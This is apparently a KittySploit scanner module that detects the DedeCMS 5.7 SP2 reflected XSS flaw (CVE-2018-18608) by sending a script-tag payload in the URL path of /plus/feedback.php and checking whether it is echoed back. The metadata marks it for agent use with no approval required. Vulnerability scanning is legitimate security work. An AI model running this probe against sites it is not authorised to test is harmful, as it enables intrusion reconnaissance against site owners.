#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DedeCMS 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DedeCMS 5.7 SP2 - Cross-Site Scripting Detection',
        'description': 'DedeCMS 5.7 SP2 is vulnerable to cross-site scripting via the function named GetPageList defined in the include/datalistcp.class.php file that is used to display the page numbers list at the bottom of some templates, as demonstrated by the PATH_INFO to /member/index.php, /member/pm.php, /member/content_list.php, or /plus/feedback.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'dedecms', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/ky-j/dedecms/issues/8',
            'https://github.com/ky-j/dedecms/files/2504649/Reflected.XSS.Vulnerability.exists.in.the.file.of.DedeCMS.V5.7.SP2.docx',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-18608',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-18608',
    }

    def run(self):
        r = self.http_request(method="GET", path='/plus/feedback.php/rp4hu%27><script>alert%28document.domain%29<%2fscript>?aid=3', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("'><script>alert(document.domain)</script>", 'DedeCMS Error Warning!',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="DedeCMS 5.7 SP2 - Cross-Site Scripting detected",
                path='/plus/feedback.php/rp4hu%27><script>alert%28document.domain%29<%2fscript>?aid=3',
            )
            return True
        return False

